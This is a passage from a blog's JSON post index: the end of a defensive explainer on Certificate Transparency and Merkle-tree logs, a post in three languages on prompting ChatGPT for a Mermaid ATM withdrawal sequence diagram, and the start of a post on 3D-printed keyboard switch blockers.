CA: They trick or hack a CA into issuing a certificate for example.com Certificate gets logged: The CA submits it to CT logs (required by browsers) You receive alert: Your monitoring service detects the unauthorized certificate You take action: You report the fraudulent certificate, get it revoked, and investigate the breach Without CT, you might never know about the fraudulent certificate until it's used in an attack. The Technical Foundation: Merkle Trees At the heart of Certificate Transparency lies an elegant data structure: the Merkle tree. This cryptographic structure makes CT logs both efficient and tamper-proof. A Merkle tree organizes certificates in a binary tree where: Each leaf node contains a hash of a certificate Each parent node contains a hash of its two children The root hash represents the entire log’s state This structure provides powerful properties: Efficient Verification: To prove a certificate is in the log, you only need to provide a small “audit path” of hashes from the certificate to the root - not the entire log. For a log with a million certificates, you only need about 20 hashes to prove inclusion. Tamper Detection: Any change to any certificate in the log changes the root hash. Since the root hash is publicly known and monitored, tampering is immediately detectable. Append-Only Proof: The Merkle tree structure allows proving that a log has only grown (new certificates added) without modifying or removing old entries. This is called a “consistency proof.” graph TB A([Root HashH1234]) --> B([H12]) A --> C([H34]) B --> D([H1Cert 1]) B --> E([H2Cert 2]) C --> F([H3Cert 3]) C --> G([H4Cert 4]) style A fill:#e8f5e9,stroke:#388e3c,stroke-width:3px style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#fff3e0,stroke:#f57c00,stroke-width:2px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px 🔐 Cryptographic GuaranteeThe Merkle tree structure provides mathematical certainty: To prove Cert 2 is in the log, provide: H1, H34 Verifier computes: H2 (hash of Cert 2), then H12 = hash(H1 + H2), then Root = hash(H12 + H34) If computed root matches the published root, Cert 2 is definitely in the log This requires only 2 hashes instead of downloading all 4 certificates Benefits of Certificate Transparency The implementation of CT has delivered tangible security improvements across the web: Early Detection of Misissued Certificates: Domain owners can detect unauthorized certificates within hours or days instead of months or never. This dramatically reduces the window of opportunity for attackers. Accountability for Certificate Authorities: CAs know their actions are publicly visible and auditable. This creates strong incentives for proper security practices and careful validation. Reduced Impact of CA Compromises: When a CA is compromised, CT logs provide a complete record of all fraudulent certificates issued, enabling rapid response and revocation. Research and Analysis: Security researchers can analyze CT logs to identify trends, discover misconfigurations, and improve certificate practices across the industry. Compliance and Auditing: Organizations can prove they’re following certificate policies and quickly identify shadow IT or unauthorized certificate issuance within their domains. ✨ Real ImpactSince CT became mandatory: Symantec incident (2017): CT logs revealed Symantec had issued 30,000+ certificates without proper validation, leading to their removal from browser trust stores Faster detection: Average time to detect misissued certificates dropped from months to hours Increased accountability: CAs invest more in security knowing their actions are transparent Reduced fraud: The risk of detection makes fraudulent certificate issuance much less attractive to attackers Monitoring Certificate Transparency Logs One of CT’s most powerful features is that anyone can monitor the logs. Several tools and services make this accessible: crt.sh: A free web interface for searching CT logs. Simply enter a domain name to see all certificates ever issued for it. This is invaluable for domain owners checking for unauthorized certificates. Facebook CT Monitoring: Facebook offers a free service that monitors CT logs for your domains and sends alerts when new certificates are issued. Google CT Search: Google provides tools for searching and analyzing CT logs, useful for security research and investigation. Certstream: A real-time stream of certificates as they’re added to CT logs. Security researchers use this to detect phishing domains, typosquatting, and other malicious activity. Commercial Services: Companies like Censys, Shodan, and various security vendors offer advanced CT monitoring with alerting, analysis, and integration with security operations. 🔍 Try It YourselfVisit crt.sh and search for a domain you own or a popular website: Enter the domain (e.g., google.com) See all certificates issued for that domain Notice the timestamps, certificate authorities, and validity periods Look for any unexpected or suspicious certificates This transparency is available to everyone - no special access required. Challenges and Limitations While Certificate Transparency has been remarkably successful, it’s not without challenges: Privacy Concerns: Every certificate issued becomes public knowledge. This means anyone can see what domains and subdomains you’re using, potentially revealing internal infrastructure or upcoming projects before you’re ready to announce them. Log Scalability: As the web grows and certificate lifetimes shorten (from years to months), CT logs must handle increasing volumes. Billions of certificates need to be logged, stored, and made queryable. Monitoring Overhead: Domain owners with thousands of domains need sophisticated monitoring systems to track all certificates. Small organizations may lack resources for effective monitoring. False Positives: Legitimate certificate renewals, testing certificates, and CDN certificates can trigger alerts, requiring careful tuning of monitoring systems. Incomplete Coverage: While major browsers enforce CT, some clients and applications don’t. This creates gaps where fraudulent certificates might still be used. Log Operator Trust: While CT reduces trust in CAs, it shifts some trust to log operators. Misbehaving logs could refuse to log certificates or provide false proofs, though the multi-log requirement and auditing mitigate this risk. ⚠️ Privacy ConsiderationBefore requesting a certificate for a sensitive subdomain: Remember it will appear in public CT logs Consider using wildcard certificates for internal subdomains Be aware that CT logs reveal your infrastructure topology Plan domain naming strategies with transparency in mind The Future of Certificate Transparency Certificate Transparency continues to evolve, with several developments on the horizon: Shorter Certificate Lifetimes: The industry is moving toward shorter certificate validity periods (from 2 years to 1 year to potentially 90 days). This reduces the impact of compromised certificates but increases the volume of certificates that must be logged. Improved Privacy: Research into privacy-preserving CT mechanisms aims to provide transparency without revealing sensitive domain information. Techniques like redaction and delayed publication are being explored. Expanded Scope: The CT model is being adapted for other trust systems beyond HTTPS certificates, including code signing certificates, email certificates, and even software supply chain transparency. Better Integration: Tighter integration between CT logs, certificate authorities, and monitoring systems will enable faster detection and response to misissued certificates. Automated Response: Future systems may automatically revoke suspicious certificates detected in CT logs, reducing the time window for attacks from hours to minutes. Decentralization: Blockchain-based approaches could further decentralize CT logs, reducing reliance on specific log operators and increasing resilience. timeline title Evolution of Certificate Transparency 2011 : DigiNotar Breach : Wake-up call for certificate security 2013 : CT Specification (RFC 6962) : Google proposes Certificate Transparency 2015 : Chrome CT Enforcement Begins : Browsers start requiring CT 2018 : CT Mandatory for All Certificates : All major browsers enforce CT 2023 : Mature Ecosystem : Billions of certificates logged : Widespread monitoring and tooling Future : Enhanced Privacy & Automation : Privacy-preserving mechanisms : Automated threat response Getting Started with Certificate Transparency Whether you’re a domain owner, security professional, or curious developer, here’s how to start using CT: For Domain Owners Step 1: Understand Your Current Certificates Visit crt.sh and search for your domains Review all certificates issued for your domains Identify any unexpected or unauthorized certificates Step 2: Set Up Monitoring Use free services like Facebook CT Monitoring or crt.sh alerts Configure notifications for new certificates on your domains Establish a process for investigating alerts Step 3: Establish Response Procedures Define who investigates certificate alerts Create a process for verifying legitimate certificates Document steps for reporting and revoking fraudulent certificates For Security Researchers Step 1: Explore CT Logs Use crt.sh to search for interesting patterns Try Certstream for real-time certificate monitoring Analyze certificate issuance trends and anomalies Step 2: Build Monitoring Tools Use CT log APIs to build custom monitoring Create alerts for specific patterns (typosquatting, phishing domains) Contribute to open-source CT tools Step 3: Contribute to the Ecosystem Report suspicious certificates to domain owners Share findings with the security community Help improve CT tools and documentation For Developers Step 1: Understand CT Requirements Learn how browsers enforce CT policies Understand SCT requirements for certificates Review your certificate issuance process Step 2: Implement CT Verification Verify SCTs in your applications Use CT log APIs to check certificate status Implement monitoring for your organization’s domains Step 3: Stay Informed Follow CT policy changes from browsers Monitor CT log operator announcements Participate in CT community discussions 🎯 Quick Start ExerciseTry this hands-on exercise to understand CT: Visit crt.sh Search for facebook.com Notice the thousands of certificates issued Click on a recent certificate to see details Observe the SCT information showing which CT logs recorded it Now search for your own domain (if you have one) Verify all certificates are legitimate This 5-minute exercise demonstrates the transparency that protects the entire web. Conclusion: Transparency as a Security Foundation Certificate Transparency represents a fundamental shift in how we approach trust on the internet. Instead of blindly trusting certificate authorities, we now have a system where trust is verified through transparency, cryptography, and public accountability. The success of CT demonstrates a powerful principle: transparency makes systems more secure. When actions are public and auditable, bad actors face detection and consequences. This principle extends beyond certificates to software supply chains, code signing, and other trust systems. For domain owners, CT provides peace of mind - you’ll know if someone tries to impersonate your website. For security researchers, it’s an invaluable tool for detecting threats and analyzing trends. For the broader internet community, it’s a foundation of trust that makes HTTPS more reliable and secure. The little padlock icon in your browser represents more than encryption - it represents a transparent, auditable system where fraudulent certificates can’t hide in the shadows. That’s the power of Certificate Transparency. 💭 Final Thought&quot;Sunlight is said to be the best of disinfectants.&quot; - Louis Brandeis Certificate Transparency brings sunlight to the certificate ecosystem, making the web safer for everyone through the simple but powerful principle of public accountability. Additional Resources Official Specifications: RFC 6962: Certificate Transparency RFC 9162: Certificate Transparency Version 2.0 Tools and Services: crt.sh - Search CT logs Facebook CT Monitoring - Free monitoring service Certstream - Real-time certificate stream Learning Resources: Certificate Transparency: The Foundation of Trust Google’s CT Policy CT Log List","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://neo01.com/tags/HTTPS/"},{"name":"Certificate","slug":"Certificate","permalink":"https://neo01.com/tags/Certificate/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://neo01.com/tags/Cryptography/"},{"name":"Web Security","slug":"Web-Security","permalink":"https://neo01.com/tags/Web-Security/"}]},{"title":"Using ChatGPT to Draw Sequence Diagram","slug":"2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram/","permalink":"https://neo01.com/2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram/","excerpt":"Generate professional sequence diagrams effortlessly with ChatGPT and Mermaid, transforming complex system interactions into clear visual documentation.","text":"To use ChatGPT to generate a sequence diagram, you can provide a description of the system and the interactions between its components. The description should be written in a clear and concise manner, using plain language and logical ordering of events. Once you have the description, you can use a tool like Mermaid to create the diagram. In the following example using ChatGPT 3.5 Turbo, we have described the process of a user withdrawing cash from an ATM using their bank’s mobile app. We have requested that a sequence diagram be generated using Mermaid syntax. We refined the prompt approximately 10 times to ensure the best possible result. write mermaid to generate sequence diagram for a journey of a user to withdraw cash from atm by using his bank mobile app. user presses “withdraw cash from atm” button from bank app, user inputs the amount of cash to withdraw user presses “start to withdraw” button from bank app, the bank app activates the camera by itself and is ready to scan a QR code the user presses a button on the ATM to show the mobile cash withdrawal QR code the atm calls withdraw token API to request a mobile withdraw token the withdraw token API generates a token with expiry, stores it into database, and then sends the token back to the atm the atm generates the QR code from the token, and then presents the QR code on atm screen the bank app scans the QR code and sends the token and withdraw amount to withdraw request api the withdraw request api checks if the token exists in the database. bank app shows invalid QR code if it does not exist. the withdraw request api checks if the token expired. bank app shows invalid QR code if it is expired. if the token exists and is not expired, the withdraw request api invalidates the token from database, and then commits the transaction with the token from transaction api. the transaction updates transaction status to database the atm polls “transaction status api” to check if the transaction with the token has been completed. “transaction status api” checks status from database and replies status to ATM. once completed, presents cash to user. the user picks up cash from atm ChatGPT generates natural language descriptions of a given prompt, which can be helpful for reviewing whether the prompt is clear and understandable to the model. Below is the script generated by ChatGPT. sequenceDiagram participant BankApp participant User participant ATM participant WithdrawTokenAPI participant WithdrawRequestAPI participant TransactionAPI participant Database participant TransactionStatusAPI User-&gt;&gt;+BankApp: Press &#39;Withdraw Cash from ATM&#39; button User-&gt;&gt;+BankApp: Input amount of cash to withdraw User-&gt;&gt;+BankApp: Press &#39;Start to Withdraw&#39; button BankApp-&gt;&gt;+BankApp: Activate camera by itself User-&gt;&gt;+ATM: Press button to show mobile withdraw QR code ATM-&gt;&gt;+WithdrawTokenAPI: Call withdraw token API WithdrawTokenAPI-&gt;&gt;+Database: Store token with expiry WithdrawTokenAPI--&gt;&gt;-ATM: Send token ATM-&gt;&gt;+ATM: Generate QR code from token ATM-&gt;&gt;+User: Present mobile withdraw QR code BankApp-&gt;&gt;+WithdrawRequestAPI: Scan QR code and send token and amount WithdrawRequestAPI-&gt;&gt;+Database: Check if token exists Database--&gt;&gt;-WithdrawRequestAPI: Return token existence WithdrawRequestAPI-&gt;&gt;+Database: Check if token is expired Database--&gt;&gt;-WithdrawRequestAPI: Return token expiry alt Token exists and is not expired WithdrawRequestAPI-&gt;&gt;+Database: Invalidate token in database WithdrawRequestAPI-&gt;&gt;+TransactionAPI: Commit transaction with token TransactionAPI-&gt;&gt;+Database: Update transaction status to database ATM-&gt;&gt;+TransactionStatusAPI: Poll transaction status API to check transaction completion TransactionStatusAPI-&gt;&gt;+Database: Check transaction status from database Database--&gt;&gt;-TransactionStatusAPI: Return transaction completion status TransactionStatusAPI--&gt;&gt;-ATM: Return transaction completion status ATM-&gt;&gt;+User: Present cash to user User-&gt;&gt;+ATM: Pick up cash else Token does not exist or is expired BankApp-&gt;&gt;+User: Show invalid QR code message end In this diagram, each participant is represented as a vertical line. The arrows indicate the flow of messages between the participants. The journey starts with the user pressing the ‘Withdraw Cash from ATM’ button in the bank app and inputting the amount of cash to withdraw. The user then presses the ‘Start to Withdraw’ button, which activates the camera in the bank app. The user then presses a button on the ATM to show the mobile withdraw QR code. The ATM calls the Withdraw Token API to request a mobile withdraw token, which is stored in the database and sent back to the ATM. The ATM generates a QR code from the token and presents it on the ATM screen. The bank app scans the QR code and sends the token and withdraw amount to the Withdraw Request API. The Withdraw Request API checks if the token exists in the database and if it is expired. If the token exists and is not expired, the Withdraw Request API invalidates the token in the database and commits the transaction with the token from the Transaction API. The Transaction API updates the transaction status to the database. The ATM polls the Transaction Status API to check for transaction completion, and the Transaction Status API checks the transaction status from the database and returns it to the ATM. Once the transaction is completed, the ATM presents the cash to the user. Finally, the user picks up the cash from the ATM, completing the withdrawal process. If the token does not exist or is expired, the bank app shows an invalid QR code message to the user. Below is the resulting sequence diagram. For the best experience, you should view it in mermaid live editor. sequenceDiagram participant BankApp participant User participant ATM participant WithdrawTokenAPI participant WithdrawRequestAPI participant TransactionAPI participant Database participant TransactionStatusAPI User->>+BankApp: Press 'Withdraw Cash from ATM' button User->>+BankApp: Input amount of cash to withdraw User->>+BankApp: Press 'Start to Withdraw' button BankApp->>+BankApp: Activate camera by itself User->>+ATM: Press button to show mobile withdraw QR code ATM->>+WithdrawTokenAPI: Call withdraw token API WithdrawTokenAPI->>+Database: Store token with expiry WithdrawTokenAPI-->>-ATM: Send token ATM->>+ATM: Generate QR code from token ATM->>+User: Present mobile withdraw QR code BankApp->>+WithdrawRequestAPI: Scan QR code and send token and amount WithdrawRequestAPI->>+Database: Check if token exists Database-->>-WithdrawRequestAPI: Return token existence WithdrawRequestAPI->>+Database: Check if token is expired Database-->>-WithdrawRequestAPI: Return token expiry alt Token exists and is not expired WithdrawRequestAPI->>+Database: Invalidate token in database WithdrawRequestAPI->>+TransactionAPI: Commit transaction with token TransactionAPI->>+Database: Update transaction status to database ATM->>+TransactionStatusAPI: Poll transaction status API to check transaction completion TransactionStatusAPI->>+Database: Check transaction status from database Database-->>-TransactionStatusAPI: Return transaction completion status TransactionStatusAPI-->>-ATM: Return transaction completion status ATM->>+User: Present cash to user User->>+ATM: Pick up cash else Token does not exist or is expired BankApp->>+User: Show invalid QR code message end","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"使用 ChatGPT 繪製序列圖","slug":"2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram-zh-TW","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram/","permalink":"https://neo01.com/zh-TW/2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram/","excerpt":"用 ChatGPT 和 Mermaid 輕鬆生成專業序列圖，將複雜系統互動轉化為清晰可視化文件。","text":"要使用 ChatGPT 生成序列圖，您可以提供系統及其元件之間互動的描述。描述應以清晰簡潔的方式撰寫，使用簡單的語言和邏輯的事件順序。一旦您有了描述，就可以使用 Mermaid 等工具來建立圖表。 在以下使用 ChatGPT 3.5 Turbo 的範例中，我們描述了使用者使用其銀行的行動應用程式從 ATM 提款的過程。我們要求使用 Mermaid 語法生成序列圖。我們將提示精煉了大約 10 次以確保獲得最佳結果。 write mermaid to generate sequence diagram for a journey of a user to withdraw cash from atm by using his bank mobile app. user presses “withdraw cash from atm” button from bank app, user inputs the amount of cash to withdraw user presses “start to withdraw” button from bank app, the bank app activates the camera by itself and is ready to scan a QR code the user presses a button on the ATM to show the mobile cash withdrawal QR code the atm calls withdraw token API to request a mobile withdraw token the withdraw token API generates a token with expiry, stores it into database, and then sends the token back to the atm the atm generates the QR code from the token, and then presents the QR code on atm screen the bank app scans the QR code and sends the token and withdraw amount to withdraw request api the withdraw request api checks if the token exists in the database. bank app shows invalid QR code if it does not exist. the withdraw request api checks if the token expired. bank app shows invalid QR code if it is expired. if the token exists and is not expired, the withdraw request api invalidates the token from database, and then commits the transaction with the token from transaction api. the transaction updates transaction status to database the atm polls “transaction status api” to check if the transaction with the token has been completed. “transaction status api” checks status from database and replies status to ATM. once completed, presents cash to user. the user picks up cash from atm ChatGPT 生成給定提示的自然語言描述，這有助於檢閱提示是否清晰且模型可以理解。以下是 ChatGPT 生成的腳本。 sequenceDiagram participant BankApp participant User participant ATM participant WithdrawTokenAPI participant WithdrawRequestAPI participant TransactionAPI participant Database participant TransactionStatusAPI User-&gt;&gt;+BankApp: Press &#39;Withdraw Cash from ATM&#39; button User-&gt;&gt;+BankApp: Input amount of cash to withdraw User-&gt;&gt;+BankApp: Press &#39;Start to Withdraw&#39; button BankApp-&gt;&gt;+BankApp: Activate camera by itself User-&gt;&gt;+ATM: Press button to show mobile withdraw QR code ATM-&gt;&gt;+WithdrawTokenAPI: Call withdraw token API WithdrawTokenAPI-&gt;&gt;+Database: Store token with expiry WithdrawTokenAPI--&gt;&gt;-ATM: Send token ATM-&gt;&gt;+ATM: Generate QR code from token ATM-&gt;&gt;+User: Present mobile withdraw QR code BankApp-&gt;&gt;+WithdrawRequestAPI: Scan QR code and send token and amount WithdrawRequestAPI-&gt;&gt;+Database: Check if token exists Database--&gt;&gt;-WithdrawRequestAPI: Return token existence WithdrawRequestAPI-&gt;&gt;+Database: Check if token is expired Database--&gt;&gt;-WithdrawRequestAPI: Return token expiry alt Token exists and is not expired WithdrawRequestAPI-&gt;&gt;+Database: Invalidate token in database WithdrawRequestAPI-&gt;&gt;+TransactionAPI: Commit transaction with token TransactionAPI-&gt;&gt;+Database: Update transaction status to database ATM-&gt;&gt;+TransactionStatusAPI: Poll transaction status API to check transaction completion TransactionStatusAPI-&gt;&gt;+Database: Check transaction status from database Database--&gt;&gt;-TransactionStatusAPI: Return transaction completion status TransactionStatusAPI--&gt;&gt;-ATM: Return transaction completion status ATM-&gt;&gt;+User: Present cash to user User-&gt;&gt;+ATM: Pick up cash else Token does not exist or is expired BankApp-&gt;&gt;+User: Show invalid QR code message end 在此圖表中，每個參與者都表示為一條垂直線。箭頭表示參與者之間的訊息流。 旅程從使用者在銀行應用程式中按下「從 ATM 提款」按鈕並輸入要提款的金額開始。然後使用者按下「開始提款」按鈕，這會啟動銀行應用程式中的相機。 然後使用者按下 ATM 上的按鈕以顯示行動提款 QR 碼。ATM 呼叫提款權杖 API 以請求行動提款權杖，該權杖儲存在資料庫中並發送回 ATM。 ATM 從權杖生成 QR 碼並將其顯示在 ATM 螢幕上。銀行應用程式掃描 QR 碼並將權杖和提款金額發送到提款請求 API。 提款請求 API 檢查權杖是否存在於資料庫中以及是否已過期。如果權杖存在且未過期，提款請求 API 會使資料庫中的權杖失效，並使用交易 API 的權杖提交交易。交易 API 將交易狀態更新到資料庫。 ATM 輪詢交易狀態 API 以檢查交易是否完成，交易狀態 API 從資料庫檢查交易狀態並將其返回給 ATM。一旦交易完成，ATM 就會向使用者提供現金。 最後，使用者從 ATM 取走現金，完成提款過程。如果權杖不存在或已過期，銀行應用程式會向使用者顯示無效的 QR 碼訊息。 以下是產生的序列圖。為了獲得最佳體驗，您應該在 mermaid live editor 中檢視它。 sequenceDiagram participant BankApp participant User participant ATM participant WithdrawTokenAPI participant WithdrawRequestAPI participant TransactionAPI participant Database participant TransactionStatusAPI User->>+BankApp: Press 'Withdraw Cash from ATM' button User->>+BankApp: Input amount of cash to withdraw User->>+BankApp: Press 'Start to Withdraw' button BankApp->>+BankApp: Activate camera by itself User->>+ATM: Press button to show mobile withdraw QR code ATM->>+WithdrawTokenAPI: Call withdraw token API WithdrawTokenAPI->>+Database: Store token with expiry WithdrawTokenAPI-->>-ATM: Send token ATM->>+ATM: Generate QR code from token ATM->>+User: Present mobile withdraw QR code BankApp->>+WithdrawRequestAPI: Scan QR code and send token and amount WithdrawRequestAPI->>+Database: Check if token exists Database-->>-WithdrawRequestAPI: Return token existence WithdrawRequestAPI->>+Database: Check if token is expired Database-->>-WithdrawRequestAPI: Return token expiry alt Token exists and is not expired WithdrawRequestAPI->>+Database: Invalidate token in database WithdrawRequestAPI->>+TransactionAPI: Commit transaction with token TransactionAPI->>+Database: Update transaction status to database ATM->>+TransactionStatusAPI: Poll transaction status API to check transaction completion TransactionStatusAPI->>+Database: Check transaction status from database Database-->>-TransactionStatusAPI: Return transaction completion status TransactionStatusAPI-->>-ATM: Return transaction completion status ATM->>+User: Present cash to user User->>+ATM: Pick up cash else Token does not exist or is expired BankApp->>+User: Show invalid QR code message end","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"使用 ChatGPT 绘制序列图","slug":"2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram-zh-CN","date":"un33fin33","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram/","permalink":"https://neo01.com/zh-CN/2023/05/Using_ChatGPT_to_Draw_Sequence_Diagram/","excerpt":"用 ChatGPT 和 Mermaid 轻松生成专业序列图，将复杂系统交互转化为清晰可视化文档。","text":"要使用 ChatGPT 生成序列图，您可以提供系统及其组件之间交互的描述。描述应以清晰简洁的方式撰写，使用简单的语言和逻辑的事件顺序。一旦您有了描述，就可以使用 Mermaid 等工具来创建图表。 在以下使用 ChatGPT 3.5 Turbo 的示例中，我们描述了用户使用其银行的移动应用程序从 ATM 取款的过程。我们要求使用 Mermaid 语法生成序列图。我们将提示精炼了大约 10 次以确保获得最佳结果。 write mermaid to generate sequence diagram for a journey of a user to withdraw cash from atm by using his bank mobile app. user presses “withdraw cash from atm” button from bank app, user inputs the amount of cash to withdraw user presses “start to withdraw” button from bank app, the bank app activates the camera by itself and is ready to scan a QR code the user presses a button on the ATM to show the mobile cash withdrawal QR code the atm calls withdraw token API to request a mobile withdraw token the withdraw token API generates a token with expiry, stores it into database, and then sends the token back to the atm the atm generates the QR code from the token, and then presents the QR code on atm screen the bank app scans the QR code and sends the token and withdraw amount to withdraw request api the withdraw request api checks if the token exists in the database. bank app shows invalid QR code if it does not exist. the withdraw request api checks if the token expired. bank app shows invalid QR code if it is expired. if the token exists and is not expired, the withdraw request api invalidates the token from database, and then commits the transaction with the token from transaction api. the transaction updates transaction status to database the atm polls “transaction status api” to check if the transaction with the token has been completed. “transaction status api” checks status from database and replies status to ATM. once completed, presents cash to user. the user picks up cash from atm ChatGPT 生成给定提示的自然语言描述，这有助于检阅提示是否清晰且模型可以理解。以下是 ChatGPT 生成的脚本。 sequenceDiagram participant BankApp participant User participant ATM participant WithdrawTokenAPI participant WithdrawRequestAPI participant TransactionAPI participant Database participant TransactionStatusAPI User-&gt;&gt;+BankApp: Press &#39;Withdraw Cash from ATM&#39; button User-&gt;&gt;+BankApp: Input amount of cash to withdraw User-&gt;&gt;+BankApp: Press &#39;Start to Withdraw&#39; button BankApp-&gt;&gt;+BankApp: Activate camera by itself User-&gt;&gt;+ATM: Press button to show mobile withdraw QR code ATM-&gt;&gt;+WithdrawTokenAPI: Call withdraw token API WithdrawTokenAPI-&gt;&gt;+Database: Store token with expiry WithdrawTokenAPI--&gt;&gt;-ATM: Send token ATM-&gt;&gt;+ATM: Generate QR code from token ATM-&gt;&gt;+User: Present mobile withdraw QR code BankApp-&gt;&gt;+WithdrawRequestAPI: Scan QR code and send token and amount WithdrawRequestAPI-&gt;&gt;+Database: Check if token exists Database--&gt;&gt;-WithdrawRequestAPI: Return token existence WithdrawRequestAPI-&gt;&gt;+Database: Check if token is expired Database--&gt;&gt;-WithdrawRequestAPI: Return token expiry alt Token exists and is not expired WithdrawRequestAPI-&gt;&gt;+Database: Invalidate token in database WithdrawRequestAPI-&gt;&gt;+TransactionAPI: Commit transaction with token TransactionAPI-&gt;&gt;+Database: Update transaction status to database ATM-&gt;&gt;+TransactionStatusAPI: Poll transaction status API to check transaction completion TransactionStatusAPI-&gt;&gt;+Database: Check transaction status from database Database--&gt;&gt;-TransactionStatusAPI: Return transaction completion status TransactionStatusAPI--&gt;&gt;-ATM: Return transaction completion status ATM-&gt;&gt;+User: Present cash to user User-&gt;&gt;+ATM: Pick up cash else Token does not exist or is expired BankApp-&gt;&gt;+User: Show invalid QR code message end 在此图表中，每个参与者都表示为一条垂直线。箭头表示参与者之间的消息流。 旅程从用户在银行应用程序中按下&quot;从 ATM 取款&quot;按钮并输入要取款的金额开始。然后用户按下&quot;开始取款&quot;按钮，这会启动银行应用程序中的相机。 然后用户按下 ATM 上的按钮以显示移动取款 QR 码。ATM 调用取款令牌 API 以请求移动取款令牌，该令牌存储在数据库中并发送回 ATM。 ATM 从令牌生成 QR 码并将其显示在 ATM 屏幕上。银行应用程序扫描 QR 码并将令牌和取款金额发送到取款请求 API。 取款请求 API 检查令牌是否存在于数据库中以及是否已过期。如果令牌存在且未过期，取款请求 API 会使数据库中的令牌失效，并使用交易 API 的令牌提交交易。交易 API 将交易状态更新到数据库。 ATM 轮询交易状态 API 以检查交易是否完成，交易状态 API 从数据库检查交易状态并将其返回给 ATM。一旦交易完成，ATM 就会向用户提供现金。 最后，用户从 ATM 取走现金，完成取款过程。如果令牌不存在或已过期，银行应用程序会向用户显示无效的 QR 码消息。 以下是产生的序列图。为了获得最佳体验，您应该在 mermaid live editor 中查看它。 sequenceDiagram participant BankApp participant User participant ATM participant WithdrawTokenAPI participant WithdrawRequestAPI participant TransactionAPI participant Database participant TransactionStatusAPI User->>+BankApp: Press 'Withdraw Cash from ATM' button User->>+BankApp: Input amount of cash to withdraw User->>+BankApp: Press 'Start to Withdraw' button BankApp->>+BankApp: Activate camera by itself User->>+ATM: Press button to show mobile withdraw QR code ATM->>+WithdrawTokenAPI: Call withdraw token API WithdrawTokenAPI->>+Database: Store token with expiry WithdrawTokenAPI-->>-ATM: Send token ATM->>+ATM: Generate QR code from token ATM->>+User: Present mobile withdraw QR code BankApp->>+WithdrawRequestAPI: Scan QR code and send token and amount WithdrawRequestAPI->>+Database: Check if token exists Database-->>-WithdrawRequestAPI: Return token existence WithdrawRequestAPI->>+Database: Check if token is expired Database-->>-WithdrawRequestAPI: Return token expiry alt Token exists and is not expired WithdrawRequestAPI->>+Database: Invalidate token in database WithdrawRequestAPI->>+TransactionAPI: Commit transaction with token TransactionAPI->>+Database: Update transaction status to database ATM->>+TransactionStatusAPI: Poll transaction status API to check transaction completion TransactionStatusAPI->>+Database: Check transaction status from database Database-->>-TransactionStatusAPI: Return transaction completion status TransactionStatusAPI-->>-ATM: Return transaction completion status ATM->>+User: Present cash to user User->>+ATM: Pick up cash else Token does not exist or is expired BankApp->>+User: Show invalid QR code message end","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"3D Printed Switch Blocker Cherry MX","slug":"2023/05/3D_Printed_Switch_Blocker_Cherry_MX","date":"un11fin11","updated":"un11fin11","comments":true,"path":"2023/05/3D_Printed_Switch_Blocker_Cherry_MX/","permalink":"https://neo01.com/2023/05/3D_Printed_Switch_Blocker_Cherry_MX/","excerpt":"Tired of accidental key presses? Create your own 3D printed switch blockers for Cherry MX keyboards. Get 40 for $10 from Taobao, or print your own from this free Tinkercad model!","text":"Are you tired of accidentally hitting the wrong keys on your keyboard? Do you find yourself losing precious time because of a rogue Caps Lock or Windows key? Or maybe you’re like me and have a keyboard with more keys than you actually need after mapping, leaving you with unnecessary clutter. Fear not, my friend, for there is a solution to this all-too-common problem: a 3D printed switch blocker for Cherry MX switches! The size of the switch blocker is a perfect square of 18.8x18.8mm, with a height of 1mm. However, if you’re worried about blocking LED light, you may need to increase the thickness. No worries though, because you can easily modify the design to make it work for you. But what really sets this switch blocker apart is the notch on all sides. This ensures that the switch blocker stays securely in place and doesn’t pop out at the most inconvenient times. So whether you’re in the middle of a high-stakes game or a crucial work project, you can rest assured that your switch blocker will stay put. And the best part? You can download the model for this switch blocker from Tinkercad, a free 3D modeling website. So even if you don’t have any 3D modeling skills, you can still create your own custom switch blockers! And if you’re worried about the cost, don’t be. You can link many switch blockers together to save on printing costs. In fact, you can get 40 switch blockers for around 10 USD, including shipping from mainland to Hong Kong when you order from Taobao. So, what are you waiting for? Say goodbye to those frustrating accidental key presses and hello to a more efficient and enjoyable typing or gaming experience with your very own 3D printed switch blocker for Cherry MX switches. Happy printing! 3D Model of the switch blocker:","categories":[{"name":"Misc","slug":"Misc","permalink":"https://neo01.com/categories/Misc/"}],"tags":[{"name":"3D printing","slug":"3D-printing","permalink":"https://neo01.com/tags/3D-printing/"}]},{"title":"3D 打印 Cherry MX 开关阻挡器","slug":"2023/05/3D_Printed_Switch_Blocker_Cherry_MX-zh-CN","date":"un11fin11","updated":"un11fin11","comments":true,"path":"/zh-CN/2023/05/3D_Printed_Switch_Blocker_Cherry_MX/","permalink":"https://neo01.com/zh-CN/2023/05/3D_Printed_Switch_Blocker_Cherry_MX/","excerpt":"呌烦意外按到 Caps Lock 或 Windows 键？3D 打印定制开关阻挡器，完美适配 Cherry 